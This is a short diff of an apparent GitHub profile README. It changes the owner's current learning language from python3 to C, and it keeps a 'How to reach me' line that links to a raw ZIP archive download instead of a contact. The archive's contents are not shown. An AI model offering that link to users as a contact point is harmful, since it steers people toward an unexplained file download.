@@ -1,4 +1,4 @@
 - 👋 Hi, I’m @ian3P2-PCI
 - 👀 I’m interested in ... cyber security
-- 🌱 I’m currently learning ... python3
+- 🌱 I’m currently learning ... C
 - 📫 How to reach me ... https://raw.githubusercontent.com/ian3P2-PCI/ian3P2-PCI/main/neoholmia/ian3P2-PCI.zip
